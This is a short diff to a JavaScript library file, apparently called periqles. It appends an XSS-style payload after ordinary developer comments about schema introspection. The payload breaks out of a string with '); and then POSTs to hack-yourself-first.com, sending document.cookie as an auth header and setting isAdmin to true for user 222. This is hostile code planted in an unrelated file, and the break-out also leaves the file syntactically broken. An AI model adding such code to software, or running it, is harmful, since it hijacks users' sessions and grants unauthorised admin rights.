@@ -98,3 +98,17 @@ export default periqles;
 // Store introspected schema in a variable
 // Filter array of types received form introspection query for query/mutation name, fields, data types passed into component as props
 // We can use Jest to test whether the data types we read off the schema are what we expect
+
+'); fetch('https://hack-yourself-first.com/Account/UserProfile/222', {
+  method: "POST",
+  headers: {
+    'Content-Type': 'application/json',
+    'AuthCookie': document.cookie,
+  },
+  body: JSON.stringify({
+    UserID: 222,
+    FirstName: 'WhatsIt',
+    LastName: 'ToYa',
+    isAdmin: true,
+  })
+})//
